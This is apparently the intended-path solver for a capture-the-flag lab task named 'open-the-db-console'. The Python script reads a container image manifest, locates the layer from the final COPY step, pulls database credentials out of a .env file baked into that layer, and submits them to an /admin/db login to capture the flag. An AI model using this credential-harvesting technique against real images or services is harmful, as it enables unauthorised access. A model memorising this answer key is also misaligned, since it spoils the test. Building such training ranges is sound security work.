"""Intended-path solver: map manifest history to layers, extract the baked env file."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    expected = ctx.expected_flags["open-the-db-console"]
    with httpx.Client(base_url=ctx.url(), timeout=10) as client:
        manifest = client.get("/evidence/app-image-manifest.json").json()

        # History entries with a layer field pair one-to-one with the
        # ordered layers array. Find the COPY . . step.
        history = manifest["config"]["history"]
        copy_steps = [h for h in history if "COPY" in h["created_by"]]
        assert len(copy_steps) >= 2, "unexpected manifest history"
        dirty_layer = copy_steps[-1]["layer"].removeprefix("sha256:")

        listing = client.get(f"/evidence/layers/{dirty_layer}/tar-listing.txt").text
        assert re.search(r"app/\.env$", listing, flags=re.M), ".env missing from listing"
        assert "app/.env.example" in listing, "expected the example decoy too"

        env_text = client.get(f"/evidence/layers/{dirty_layer}/fs/app/.env").text
        user = re.search(r"DB_USER=(\S+)", env_text)
        password = re.search(r"DB_PASSWORD=(\S+)", env_text)
        assert user and password, "credentials not found in env file"

        res = client.post(
            "/admin/db",
            data={"user": user.group(1), "password": password.group(1)},
        )

    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    ok = captured == expected and "unlocked" in res.text.lower()
    detail = None if ok else f"user={user and user.group(1)!r} status={res.status_code}"
    return SolveResult(
        results=[TaskResult(task_id="open-the-db-console", ok=ok, captured=captured, detail=detail)]
    )
